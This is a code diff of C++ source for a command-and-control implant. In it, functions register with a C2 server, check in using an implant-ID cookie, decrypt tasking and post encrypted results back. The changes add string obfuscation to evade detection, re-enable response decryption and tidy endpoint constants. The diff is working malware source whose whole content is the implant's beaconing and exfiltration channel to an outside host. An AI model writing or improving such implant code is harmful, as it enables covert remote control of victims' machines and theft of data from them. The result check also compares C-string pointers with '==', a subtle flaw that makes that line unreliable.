@@ -37,12 +37,18 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     PSIZE_T outSize = 0;
 
     // Register
-    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 80, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
+    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), 80, toWide(REGISTER_USER_AGENT), toWide(CONTENT_TYPE_JSON), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
+
     // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
     DEBUG_PRINTF("Register response: %s\n", res.c_str());
     // cout << res_str << endl;
     rapidjson::Document resDocument;
     resDocument.Parse(res.c_str());
+    if (resDocument.HasParseError())
+    {
+        DEBUG_PRINTF("Error parsing JSON\n");
+        return NULL;
+    }
 
     DEBUG_PRINTF("status: %d\n", resDocument["status"].GetBool());
     DEBUG_PRINTF("Config: %s\n", resDocument["c"].GetString());
@@ -55,7 +61,6 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     // We still need to decrypt the config
     string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);
 
-    cout << decryptedConfig << endl;
 
     return parseMalleableConfig(decryptedConfig, privKey);
 }
@@ -63,21 +68,26 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
 Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
 {
     PSIZE_T outSize = 0;
-    //string authCookie = "Cookie: " + profile->cookie + "=" + profile->implantId;
-    // char* authCookieString;
-    // sprintf(authCookieString, "Cookie: %s=%s", profile->cookie.c_str(), profile->implantId.c_str());
-    // cout << authCookieString << endl;
+
     std::ostringstream oss;
     oss << OBFUSCATED("Cookie: ") << profile->cookie << "=" << profile->implantId;
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
-    string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 80, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, USE_TLS);
+    string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), 80, string_to_lpcwstr(profile->cookie), authCookie.c_str(), NULL, 0, outSize, USE_TLS);
+
+    if (res.empty())
+    {
+        DEBUG_PRINTF("Checkin failed\n");
+        return NULL;
+    }
+
     DEBUG_PRINTF("Checkin done\n");
+    DEBUG_PRINTF("Response: %s\n", res.c_str());
     // decode and decrypt the response
-    string resDecoded = res; /*decryptB64String(profile->base64ServerPublicKey,
+    string resDecoded = decryptB64String(profile->base64ServerPublicKey,
                                          profile->base64EncryptionKey,
-                                         res);*/
+                                         res);
 
     DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
     
@@ -122,16 +132,16 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
 
     // Build auth cookie
     std::ostringstream oss;
-    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
+    oss << OBFUSCATED("Cookie: ") << profile->cookie << "=" << profile->implantId;
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
 
     // Send the results
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 80, L"Hello-world", authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);
+    string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->cookie), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);
     
     DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
 
-    return res.c_str() == "OK";
+    return res.c_str() == OBFUSCATED("OK");
 
 }
